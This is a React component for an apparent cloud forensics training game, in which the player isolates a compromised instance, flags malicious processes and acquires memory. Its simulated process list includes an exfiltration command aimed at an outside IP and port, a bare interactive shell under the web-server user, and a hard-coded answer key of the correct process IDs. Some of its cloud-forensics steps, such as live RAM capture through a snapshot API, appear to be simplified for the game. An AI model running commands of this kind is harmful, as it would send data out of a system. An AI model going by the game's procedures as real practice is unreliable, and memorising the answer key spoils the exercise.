import { useState, useEffect } from 'react';
import {
  Power, HardDrive, Wifi, WifiOff, Camera, Clock, Activity,
  Server, Network, ShieldCheck, Terminal, CheckCircle, AlertTriangle,
  HelpCircle, Eye,
} from 'lucide-react';
import { ACTIONS } from '../gameState';

const PROCESSES = [
  { pid: 1,    user: 'root',     cpu: '0.0',  mem: '0.1',  cmd: '/sbin/init splash',                                                          suspicious: false },
  { pid: 245,  user: 'root',     cpu: '0.0',  mem: '0.2',  cmd: 'kworker/u4:2',                                                              suspicious: false },
  { pid: 831,  user: 'syslog',   cpu: '0.0',  mem: '0.1',  cmd: 'rsyslogd -n -iNONE',                                                        suspicious: false },
  { pid: 1120, user: 'root',     cpu: '0.1',  mem: '0.2',  cmd: '/usr/sbin/sshd -D',                                                         suspicious: false },
  { pid: 2241, user: 'root',     cpu: '0.0',  mem: '0.1',  cmd: '/usr/sbin/cron -f',                                                         suspicious: false },
  { pid: 3105, user: 'www-data', cpu: '0.8',  mem: '2.1',  cmd: 'nginx: worker process',                                                    suspicious: false },
  { pid: 3811, user: 'mysql',    cpu: '1.2',  mem: '8.4',  cmd: 'mysqld --user=mysql --datadir=/var/lib/mysql',                              suspicious: false },
  { pid: 4191, user: 'root',     cpu: '0.1',  mem: '0.4',  cmd: '/usr/bin/python3 /opt/monitoring/cloudwatch_agent.py',                      suspicious: false },
  {
    pid: 4812, user: 'www-data', cpu: '89.2', mem: '15.3',
    cmd: 'python3 /tmp/.x/data_exfil.py --target 185.220.101.47:4444',
    suspicious: true,
    reason: 'Hidden /tmp/.x directory. Target arg matches active C2 socket. 89% CPU is consistent with bulk data exfiltration in progress.',
  },
  { pid: 5523, user: 'root',     cpu: '0.0',  mem: '0.1',  cmd: 'ps aux',                                                                    suspicious: false },
  { pid: 6677, user: 'nobody',   cpu: '0.2',  mem: '0.5',  cmd: '/usr/sbin/apache2 -k start',                                               suspicious: false },
  {
    pid: 7834, user: 'root',     cpu: '0.2',  mem: '0.4',
    cmd: 'sshd: root@pts/1 [priv]',
    suspicious: true,
    reason: 'Interactive root SSH session. No corresponding legitimate login in /var/log/auth.log. Likely the attacker\'s persistent access channel into the machine.',
  },
  { pid: 8001, user: 'root',     cpu: '0.0',  mem: '0.1',  cmd: '-bash',                                                                     suspicious: false },
  {
    pid: 9344, user: 'www-data', cpu: '3.4',  mem: '1.2',
    cmd: '/bin/sh -i',
    suspicious: true,
    reason: 'Interactive shell (-i flag) spawned under www-data context with no terminal assignment. Classic indicator of a web shell or reverse shell — the initial intrusion vector.',
  },
  { pid: 9901, user: 'root',     cpu: '0.1',  mem: '0.3',  cmd: '/usr/lib/snapd/snapd',                                                      suspicious: false },
];

const CORRECT_PIDS = new Set([4812, 7834, 9344]);

const HINTS = [
  'Look at CPU usage — normal background services rarely exceed 5%. Cross-reference with the active network sockets shown in the VM card above.',
  'Check command-line arguments for suspicious destinations. Hidden directories (starting with a dot) under /tmp are a major red flag.',
  'An interactive shell (-i) spawned under a web server user context (www-data) has no legitimate business purpose on a production machine.',
];

export default function Phase1Triage({ state, dispatch, addToast }) {
  const [wrongActionModal, setWrongActionModal] = useState(null);
  const [showSnapshotSuccess, setShowSnapshotSuccess] = useState(false);
  const [actionUsed, setActionUsed] = useState({ pause: false, ebs: false, flowlogs: false, poweroff: false });
  const [selectedPids, setSelectedPids] = useState(new Set());
  const [processResult, setProcessResult] = useState(null);
  const [showHint, setShowHint] = useState(false);
  const [hintIndex, setHintIndex] = useState(0);
  const hintsUsed = state.hintsUsed?.p1 || 0;

  const triggerWrongAction = (actionType, title, body, lesson, severity = 'warning') => {
    setWrongActionModal({ icon: '⚠️', title, body, lesson, severity });
    dispatch({ type: actionType });
  };

  const handlePowerOff = () => {
    setActionUsed(p => ({ ...p, poweroff: true }));
    triggerWrongAction(ACTIONS.POWER_OFF_VM,
      'Forensic Error: Volatile Data Destroyed',
      'Powering off the VM immediately erases all contents of its RAM — active processes, network connections, encryption keys, and in-memory attacker artifacts.',
      'Review the Order of Volatility (NIST SP 800-86 §4.2). What must be contained and preserved while the machine is still running?',
      'critical');
  };
  const handlePause = () => {
    setActionUsed(p => ({ ...p, pause: true }));
    triggerWrongAction(ACTIONS.PAUSE_VM,
      'Forensic Error: Suspend State Corruption',
      'Suspending a VM via the hypervisor forces an ACPI sleep state. This alters CPU registers, can corrupt memory structures, and often triggers anti-forensic malware designed to detect sleep states.',
      'Live memory acquisition must be performed on a RUNNING instance. Suspension is not forensically sound.');
  };
  const handleEbs = () => {
    setActionUsed(p => ({ ...p, ebs: true }));
    triggerWrongAction(ACTIONS.DISK_SNAPSHOT,
      'Forensic Error: Wrong Acquisition Target',
      'You initiated an EBS (Elastic Block Store) snapshot. This captures the non-volatile block device, NOT RAM. Active exfiltration processes and network sockets exist ONLY in volatile memory.',
      'An EBS snapshot is analogous to a disk image on a powered-off machine. Always capture volatile RAM first, then non-volatile storage.');
  };
  const handleFlowLogs = () => {
    setActionUsed(p => ({ ...p, flowlogs: true }));
    triggerWrongAction(ACTIONS.ENABLE_FLOW_LOGS,
      'Action Warning: Misplaced Priority',
      'Enabling VPC Flow Logs is excellent for post-incident network analysis, but it is entirely passive. It does nothing to stop the active exfiltration or preserve volatile RAM.',
      'Prioritize active containment (Network Isolation) first, then volatile evidence preservation. Flow Logs is a post-hoc analysis tool.');
  };
  const handleIsolate = () => {
    if (state.networkIsolated) return;
    dispatch({ type: ACTIONS.ISOLATE_NETWORK });
    addToast({ type: 'success', title: 'Network Isolated', message: 'VPC Security Group updated. All ingress/egress rules removed. Exfiltration channel closed.' });
  };
  const handleVerifyState = () => {
    if (state.stateVerified) return;
    dispatch({ type: ACTIONS.VERIFY_STATE });
    addToast({ type: 'success', title: 'State Verified', message: 'Confirmed API target state: RUNNING. Safe for memory acquisition.' });
  };
  const handleSnapshot = () => {
    if (!state.networkIsolated) {
      addToast({ type: 'error', title: 'Prerequisite Not Met', message: 'Isolate the network first to stop active data exfiltration.' });
      return;
    }
    if (!state.processesIdentified) {
      addToast({ type: 'error', title: 'Prerequisite Not Met', message: 'Complete the Process Investigation before acquiring memory.' });
      return;
    }
    dispatch({ type: ACTIONS.TAKE_SNAPSHOT });
    setShowSnapshotSuccess(true);
  };

  const togglePid = (pid) => {
    setSelectedPids(prev => {
      const next = new Set(prev);
      if (next.has(pid)) next.delete(pid); else next.add(pid);
      return next;
    });
    setProcessResult(null);
  };

  const handleAnalyzeProcesses = () => {
    const allCorrect = [...CORRECT_PIDS].every(p => selectedPids.has(p));
    const noFalsePos = [...selectedPids].every(p => CORRECT_PIDS.has(p));
    if (allCorrect && noFalsePos) {
      setProcessResult('correct');
      dispatch({ type: ACTIONS.IDENTIFY_PROCESSES });
      addToast({ type: 'success', title: 'Process Analysis Complete', message: 'All 3 malicious processes correctly identified. Memory acquisition scope established.' });
    } else {
      const falsePos = [...selectedPids].filter(p => !CORRECT_PIDS.has(p));
      const missed = [...CORRECT_PIDS].filter(p => !selectedPids.has(p));
      let penalty, note;
      if (falsePos.length > 0) {
        penalty = 15;
        note = `False positive(s) detected — PID(s) ${falsePos.join(', ')} are legitimate system processes. Flagging legitimate processes taints the scope of the investigation.`;
      } else {
        penalty = 10;
        note = `Incomplete analysis — PID(s) ${missed.join(', ')} were missed. Look for hidden directories, unexpected parent-child relationships, and shell sessions without a terminal.`;
      }
      setProcessResult({ msg: note, penalty });
      dispatch({ type: ACTIONS.PROCESS_ANALYSIS_WRONG, payload: { penalty, note } });
    }
  };

  const handleUseHint = () => {
    if (hintsUsed >= 3) return;
    dispatch({ type: ACTIONS.USE_HINT, payload: { phase: 'p1' } });
    setHintIndex(hintsUsed);
    setShowHint(true);
    addToast({ type: 'info', title: `Hint ${hintsUsed + 1}/3 Used`, message: '−5 Admissibility' });
  };

  const confirmSnapshotSuccess = () => {
    setShowSnapshotSuccess(false);
    dispatch({ type: ACTIONS.PHASE1_COMPLETE });
  };

  const CONSOLE_ACTIONS = [
    {
      id: 'pause', icon: <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/></svg>,
      label: 'Evoke ACPI S3 (Sleep)', sub: 'Trigger hypervisor-level S3 sleep state',
      onClick: handlePause, disabled: actionUsed.pause, used: actionUsed.pause,
    },
    {
      id: 'directram', icon: <HardDrive size={16} />,
      label: 'Inject LiME LKM', sub: 'Compile and load Linux Memory Extractor',
      onClick: null, disabled: true, tooltip: 'IMPOSSIBLE: No physical hardware access layer in cloud.',
    },
    {
      id: 'ebs', icon: <HardDrive size={16} />,
      label: 'Snapshot Block Device', sub: 'Clone attached non-volatile storage',
      onClick: handleEbs, disabled: actionUsed.ebs, used: actionUsed.ebs,
    },
    {
      id: 'flowlogs', icon: <Activity size={16} />,
      label: 'Activate Flow Logging', sub: 'Capture packet headers at VPC level',
      onClick: handleFlowLogs, disabled: actionUsed.flowlogs, used: actionUsed.flowlogs,
    },
    {
      id: 'poweroff', icon: <Power size={16} />,
      label: 'Evoke ACPI S5 (Off)', sub: 'Send soft shutdown signal to OS',
      onClick: handlePowerOff, disabled: actionUsed.poweroff, used: actionUsed.poweroff,
    },
    {
      id: 'isolate', icon: state.networkIsolated ? <WifiOff size={16} /> : <Wifi size={16} />,
      label: 'Modify ENI Boundaries', sub: 'Apply default-deny policy to network interface',
      onClick: handleIsolate, disabled: state.networkIsolated,
      active: state.networkIsolated,
    },
  ];

  return (
    <div style={{ padding: '1.5rem 2rem', minHeight: 'calc(100vh - 52px)', display: 'flex', flexDirection: 'column' }}>

      {/* Header row */}
      <div className="flex items-center justify-between mb-5">
        <div>
          <h1 className="text-xl font-bold mb-0.5">Phase 1: Triage & Volatility</h1>
          <p className="text-sm" style={{ color: 'var(--color-text-muted)' }}>
            Threat: Active Exfiltration. Secure the instance and acquire volatile data before auto-scaling termination.
          </p>
        </div>
        <div className="text-right">
          <div className="flex items-center gap-2 justify-end mb-1">
            <span className="font-mono text-lg font-bold" style={{ color: '#ef4444' }}>Critical Priority</span>
          </div>
          <div className="text-xs mt-1" style={{ color: 'var(--color-text-dim)' }}>Data exfiltration in progress</div>
        </div>
      </div>

      {/* Two-column grid */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 340px', gap: '1.5rem', flex: 1, alignItems: 'start' }}>

        {/* ── LEFT COLUMN ── */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>

          {/* VM Status Card */}
          <div className="card" style={{ position: 'relative', overflow: 'hidden' }}>
            <div className="vm-scan-line" />
            <div className="flex items-start justify-between mb-4">
              <div className="flex items-center gap-3">
                <div style={{ padding: '0.6rem', background: 'rgba(239,68,68,0.15)', borderRadius: 8 }}>
                  <Server size={22} style={{ color: '#ef4444' }} />
                </div>
                <div>
                  <div className="flex items-center gap-2 flex-wrap">
                    <span className="font-bold text-base">Rogue_Instance_01</span>
                    <span className="badge badge-danger">RUNNING</span>
                    {state.networkIsolated && <span className="badge badge-warning">ISOLATED</span>}
                    {state.processesIdentified && <span className="badge badge-success">TRIAGED</span>}
                    {state.snapshotTaken && <span className="badge badge-primary">SNAPSHOT DONE</span>}
                  </div>
                  <div className="font-mono text-xs mt-0.5" style={{ color: 'var(--color-text-dim)' }}>
                    i-0a1b2c3d4e5f67890 · eu-west-1a · t3.xlarge · AMI: ami-0abcdef1234567890
                  </div>
                </div>
              </div>
              <div className="flex items-center gap-1.5">
                <Activity size={14} style={{ color: '#ef4444' }} />
                <span className="text-xs font-mono" style={{ color: '#ef4444' }}>CPU 94%</span>
              </div>
            </div>

            {/* Active connections */}
            <div style={{ padding: '0.75rem', background: 'var(--color-bg)', border: '1px solid var(--color-border)', borderRadius: 6, marginBottom: '0.75rem' }}>
              <div className="text-xs mb-2 font-semibold flex items-center gap-2" style={{ color: 'var(--color-text-muted)' }}>
                <Network size={13} /> Active Network Sockets (ss/netstat map)
              </div>
              <div className="font-mono text-xs space-y-0.5">
                <div style={{ color: '#ef4444' }}>tcp ESTAB 0 0  10.0.4.22:4444   185.220.101.47:59382  users:(("python3",pid=4812,fd=3))</div>
                <div style={{ color: '#ef4444' }}>tcp ESTAB 0 0  10.0.4.22:22     185.220.101.47:11933  users:(("sshd",pid=7834,fd=4))</div>
                <div style={{ color: '#475569' }}>tcp LISTEN 0 128 0.0.0.0:80      *:*                   users:(("nginx",pid=3105,fd=6))</div>
                <div style={{ color: '#475569' }}>tcp LISTEN 0 128 0.0.0.0:443     *:*                   users:(("nginx",pid=3105,fd=8))</div>
              </div>
            </div>

            {/* Instance metadata grid */}
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '0.5rem' }}>
              {[
                { label: 'VPC', value: 'vpc-0abc123def456' },
                { label: 'Subnet', value: 'subnet-0123abcdef' },
                { label: 'Security Group', value: state.networkIsolated ? 'sg-ENI-DENY-ALL ✓' : 'sg-0xyz789 [OPEN]' },
                { label: 'IAM Profile', value: 'EC2-ProdInstanceRole' },
              ].map(({ label, value }) => (
                <div key={label} style={{ background: 'var(--color-bg)', borderRadius: 4, padding: '0.5rem', border: '1px solid var(--color-border)' }}>
                  <div className="text-xs" style={{ color: 'var(--color-text-dim)' }}>{label}</div>
                  <div className="font-mono text-xs truncate" style={{ color: state.networkIsolated && label === 'Security Group' ? '#22c55e' : 'var(--color-text-muted)' }}>{value}</div>
                </div>
              ))}
            </div>
          </div>

          {/* STEP 2: Process Tree Investigation (unlocked after isolation) */}
          {state.networkIsolated && !state.processesIdentified && (
            <div className="card" style={{ border: '1px solid rgba(99,102,241,0.5)' }}>
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2">
                  <Terminal size={16} style={{ color: 'var(--color-primary)' }} />
                  <span className="font-semibold text-sm">Step 2 — Live Process Investigation</span>
                  <span className="badge badge-primary">REQUIRED</span>
                </div>
                <button
                  className="btn btn-ghost"
                  style={{ fontSize: '0.7rem', padding: '0.2rem 0.5rem', opacity: hintsUsed >= 3 ? 0.4 : 1 }}
                  onClick={handleUseHint}
                  disabled={hintsUsed >= 3}
                  title={hintsUsed >= 3 ? 'No hints remaining' : `Use Hint (−5 Admissibility) — ${3 - hintsUsed} remaining`}
                >
                  <HelpCircle size={12} /> Hint ({3 - hintsUsed})
                </button>
              </div>
              <p className="text-xs mb-3" style={{ color: 'var(--color-text-muted)', lineHeight: 1.6 }}>
                Network isolated. Before acquiring memory, identify the malicious processes to establish the acquisition scope. Select all suspicious entries in the process list — then submit your analysis.
              </p>

              {showHint && (
                <div className="p-2 rounded mb-3 text-xs" style={{ background: 'rgba(99,102,241,0.08)', border: '1px solid rgba(99,102,241,0.3)', color: '#c7d2fe' }}>
                  <strong>Hint {hintIndex + 1}:</strong> {HINTS[hintIndex]}
                </div>
              )}

              {/* Process table */}
              <div style={{ background: '#060910', border: '1px solid var(--color-border)', borderRadius: 6, overflow: 'hidden', marginBottom: '0.75rem' }}>
                <div style={{ display: 'grid', gridTemplateColumns: '36px 64px 90px 60px 55px 1fr', padding: '0.35rem 0.75rem', background: '#0a0d14', borderBottom: '1px solid var(--color-border)' }}>
                  {['', 'PID', 'USER', 'CPU%', 'MEM%', 'COMMAND'].map(h => (
                    <div key={h} className="font-mono text-xs font-bold" style={{ color: '#475569' }}>{h}</div>
                  ))}
                </div>
                <div style={{ maxHeight: 320, overflowY: 'auto' }}>
                  {PROCESSES.map(proc => {
                    const isSel = selectedPids.has(proc.pid);
                    const cpuHigh = parseFloat(proc.cpu) > 5;
                    return (
                      <div
                        key={proc.pid}
                        onClick={() => togglePid(proc.pid)}
                        style={{
                          display: 'grid',
                          gridTemplateColumns: '36px 64px 90px 60px 55px 1fr',
                          padding: '0.3rem 0.75rem',
                          cursor: 'pointer',
                          borderBottom: '1px solid rgba(45,49,84,0.4)',
                          background: isSel ? 'rgba(99,102,241,0.12)' : 'transparent',
                          transition: 'background 0.1s',
                        }}
                        className="log-row"
                      >
                        <div className="flex items-center">
                          <div style={{
                            width: 14, height: 14, borderRadius: 3,
                            border: `2px solid ${isSel ? '#6366f1' : '#334155'}`,
                            background: isSel ? '#6366f1' : 'transparent',
                            display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
                          }}>
                            {isSel && <span style={{ color: 'white', fontSize: '0.55rem', lineHeight: 1 }}>✓</span>}
                          </div>
                        </div>
                        <div className="font-mono text-xs" style={{ color: '#64748b' }}>{proc.pid}</div>
                        <div className="font-mono text-xs" style={{ color: '#475569' }}>{proc.user}</div>
                        <div className="font-mono text-xs" style={{ color: cpuHigh ? '#ef4444' : '#475569' }}>{proc.cpu}</div>
                        <div className="font-mono text-xs" style={{ color: '#475569' }}>{proc.mem}</div>
                        <div className="font-mono text-xs" title={proc.cmd} style={{ color: '#94a3b8', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{proc.cmd}</div>
                      </div>
                    );
                  })}
                </div>
              </div>

              {processResult && processResult !== 'correct' && (
                <div className="p-3 rounded mb-3 text-xs" style={{ background: 'rgba(239,68,68,0.08)', border: '1px solid rgba(239,68,68,0.3)', color: '#fca5a5', lineHeight: 1.6 }}>
                  <strong className="block mb-1">⚠ Analysis Failed (−{processResult.penalty} Admissibility)</strong>
                  {processResult.msg}
                </div>
              )}

              <div className="flex items-center justify-between">
                <span className="text-xs" style={{ color: 'var(--color-text-dim)' }}>
                  {selectedPids.size} process{selectedPids.size !== 1 ? 'es' : ''} selected
                </span>
                <button
                  className="btn btn-primary"
                  disabled={selectedPids.size === 0}
                  onClick={handleAnalyzeProcesses}
                >
                  <Terminal size={14} /> Analyze Selected Processes
                </button>
              </div>
            </div>
          )}

          {/* Process result (after correct) */}
          {state.processesIdentified && (
            <div className="p-3 rounded font-mono text-xs" style={{ background: 'rgba(34,197,94,0.06)', border: '1px solid rgba(34,197,94,0.3)', color: '#86efac', lineHeight: 1.8 }}>
              <CheckCircle size={13} style={{ display: 'inline', marginRight: 6 }} />
              <strong>Process Investigation Complete</strong><br/>
              ✓ PID 4812 · python3 /tmp/.x/data_exfil.py — PRIMARY EXFILTRATION PROCESS<br/>
              ✓ PID 7834 · sshd: root@pts/1 [priv] — ATTACKER PERSISTENCE CHANNEL<br/>
              ✓ PID 9344 · /bin/sh -i — REVERSE SHELL / INITIAL ACCESS VECTOR
            </div>
          )}

          {/* STEP 3: Acquisition Sub-Routine */}
          {state.networkIsolated && state.processesIdentified && (
            <div className="card" style={{ background: '#080c14', border: '1px solid var(--color-border)' }}>
              <div className="text-xs font-semibold uppercase tracking-wider mb-3" style={{ color: 'var(--color-text-muted)' }}>
                Step 3 — Memory Acquisition Sub-Routine
              </div>
              <div className="flex gap-3">
                <button
                  className="btn"
                  style={{
                    flex: 1, height: 'auto', padding: '0.875rem', flexDirection: 'column', alignItems: 'flex-start',
                    background: state.stateVerified ? 'rgba(34,197,94,0.1)' : 'var(--color-surface-2)',
                    borderColor: state.stateVerified ? '#22c55e' : 'var(--color-border)',
                  }}
                  onClick={handleVerifyState}
                  disabled={state.stateVerified}
                >
                  <div className="flex items-center gap-2 mb-1" style={{ color: state.stateVerified ? '#86efac' : 'var(--color-text)' }}>
                    <ShieldCheck size={15} /> <span className="font-semibold text-sm">Verify VM State</span>
                  </div>
                  <span className="text-xs opacity-70" style={{ color: state.stateVerified ? '#86efac' : 'var(--color-text-muted)' }}>
                    Confirm RUNNING state via DescribeInstances API before snapshot call
                  </span>
                </button>
                <button
                  className="btn pulse-glow"
                  style={{
                    flex: 1, height: 'auto', padding: '0.875rem', flexDirection: 'column', alignItems: 'flex-start',
                    background: state.snapshotTaken ? 'rgba(34,197,94,0.1)' : 'rgba(99,102,241,0.15)',
                    borderColor: state.snapshotTaken ? '#22c55e' : '#6366f1',
                    color: state.snapshotTaken ? '#86efac' : '#a5b4fc',
                  }}
                  onClick={handleSnapshot}
                  disabled={state.snapshotTaken}
                >
                  <div className="flex items-center gap-2 mb-1">
                    <Camera size={15} /> <span className="font-semibold text-sm">API Memory Snapshot</span>
                  </div>
                  <span className="text-xs opacity-70">
                    Execute CSP live RAM acquisition via CreateSnapshot API
                  </span>
                </button>
              </div>
            </div>
          )}
        </div>

        {/* ── RIGHT COLUMN: Console ── */}
        <div style={{ position: 'sticky', top: '68px' }}>
          <div className="card">
            <div className="text-xs font-semibold uppercase tracking-wider mb-3" style={{ color: 'var(--color-text-muted)' }}>
              Cloud Incident Responder Console
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
              {CONSOLE_ACTIONS.map(a => (
                <button
                  key={a.id}
                  className="btn btn-ghost"
                  style={{
                    justifyContent: 'flex-start', padding: '0.75rem 1rem',
                    flexDirection: 'column', alignItems: 'flex-start', height: 'auto',
                    opacity: a.used ? 0.35 : 1,
                    ...(a.active ? { background: 'rgba(34,197,94,0.1)', borderColor: '#22c55e', color: '#86efac' } : {}),
                  }}
                  onClick={a.onClick || undefined}
                  disabled={a.disabled}
                  data-tooltip={a.tooltip}
                >
                  <div className="flex items-center gap-2 mb-0.5">
                    {a.icon}
                    <span className="font-semibold text-sm">{a.label}</span>
                    {a.used && <span className="badge badge-danger" style={{ fontSize: '0.6rem' }}>VIOLATION</span>}
                    {a.active && <span className="badge badge-success" style={{ fontSize: '0.6rem' }}>DONE</span>}
                  </div>
                  <span className="text-xs opacity-60 text-left">{a.sub}</span>
                </button>
              ))}
            </div>

            {/* Procedural checklist */}
            <div style={{ marginTop: '1rem', paddingTop: '1rem', borderTop: '1px solid var(--color-border)' }}>
              <div className="text-xs font-semibold uppercase tracking-wider mb-2" style={{ color: 'var(--color-text-dim)' }}>
                Procedure Checklist
              </div>
              {[
                { label: 'Modify ENI Boundaries', done: state.networkIsolated },
                { label: 'Identify Malicious Processes', done: state.processesIdentified },
                { label: 'Verify Instance State', done: state.stateVerified },
                { label: 'Acquire Memory Snapshot', done: state.snapshotTaken },
              ].map(({ label, done }) => (
                <div key={label} className="flex items-center gap-2 mb-1.5">
                  <div style={{
                    width: 16, height: 16, borderRadius: '50%',
                    background: done ? 'rgba(34,197,94,0.2)' : 'var(--color-bg)',
                    border: `2px solid ${done ? '#22c55e' : 'var(--color-border)'}`,
                    display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
                  }}>
                    {done && <span style={{ color: '#22c55e', fontSize: '0.55rem' }}>✓</span>}
                  </div>
                  <span className="text-xs" style={{ color: done ? '#86efac' : 'var(--color-text-dim)' }}>{label}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Reference card */}
          <div className="card mt-3" style={{ background: 'rgba(99,102,241,0.05)', border: '1px solid rgba(99,102,241,0.2)' }}>
            <div className="text-xs font-semibold mb-2" style={{ color: '#a5b4fc' }}>📚 Order of Volatility</div>
            <div className="text-xs space-y-1" style={{ color: 'var(--color-text-dim)', lineHeight: 1.6 }}>
              <div>1. CPU registers &amp; cache</div>
              <div>2. RAM (active processes, network state)</div>
              <div>3. Virtual memory / swap</div>
              <div>4. Network connections</div>
              <div>5. Running processes</div>
              <div style={{ color: '#475569' }}>6. Disk (non-volatile)</div>
              <div style={{ color: '#475569' }}>7. Remote logging / cloud audit</div>
            </div>
            <div className="text-xs mt-2" style={{ color: '#475569' }}>Ref: NIST SP 800-86 §4.2</div>
          </div>
        </div>
      </div>

      {/* ── WRONG ACTION MODAL ── */}
      {wrongActionModal && (
        <div className="modal-overlay">
          <div className="modal">
            <div className="text-4xl text-center mb-3">{wrongActionModal.icon}</div>
            <h2 className="text-lg font-bold text-center mb-1" style={{ color: wrongActionModal.severity === 'critical' ? '#ef4444' : '#f59e0b' }}>
              {wrongActionModal.title}
            </h2>
            {wrongActionModal.severity === 'critical' && (
              <div className="text-center mb-4"><span className="badge badge-danger">CRITICAL VIOLATION</span></div>
            )}
            <p className="text-sm mb-4" style={{ color: 'var(--color-text-muted)', lineHeight: 1.7 }}>{wrongActionModal.body}</p>
            <div className="p-3 rounded mb-5 text-sm" style={{ background: 'rgba(34,197,94,0.08)', border: '1px solid rgba(34,197,94,0.2)', color: '#86efac' }}>
              <strong className="block mb-1">✓ Correct Procedure:</strong>
              <span style={{ opacity: 0.9 }}>{wrongActionModal.lesson}</span>
            </div>
            <button className="btn btn-primary" style={{ width: '100%' }} onClick={() => setWrongActionModal(null)}>
              Understood — Continue Investigation
            </button>
          </div>
        </div>
      )}

      {/* ── SNAPSHOT SUCCESS MODAL ── */}
      {showSnapshotSuccess && (
        <div className="modal-overlay">
          <div className="modal">
            <div className="text-5xl text-center mb-3">📸</div>
            <h2 className="text-lg font-bold text-center mb-2" style={{ color: '#22c55e' }}>
              RAM Snapshot Acquired — Evidence Preserved
            </h2>
            <div className="space-y-1.5 mb-5 font-mono text-xs p-3 rounded" style={{ background: 'var(--color-bg)', border: '1px solid var(--color-border)' }}>
              <div style={{ color: '#86efac' }}>✓ Network SG modified — no ingress/egress</div>
              <div style={{ color: '#86efac' }}>✓ Malicious processes catalogued: [4812, 7834, 9344]</div>
              {state.stateVerified
                ? <div style={{ color: '#86efac' }}>✓ DescribeInstances → state: RUNNING</div>
                : <div style={{ color: '#f59e0b' }}>⚠ State verification skipped (−10 Admissibility)</div>
              }
              <div style={{ color: '#86efac' }}>✓ CreateSnapshot API call successful</div>
              <div style={{ color: '#86efac' }}>✓ 32 GB logical memory block captured</div>
              <div style={{ color: '#86efac' }}>✓ Snapshot ID: snap-0abc1234def56789a</div>
            </div>
            <p className="text-sm mb-5" style={{ color: 'var(--color-text-muted)' }}>
              Volatile memory preserved via CSP API. Chain of custody intact. The instance may now be safely terminated by the auto-scaler.
            </p>
            <button className="btn btn-primary" style={{ width: '100%' }} onClick={confirmSnapshotSuccess}>
              Advance to Phase 2: S3 Evidence Triage →
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
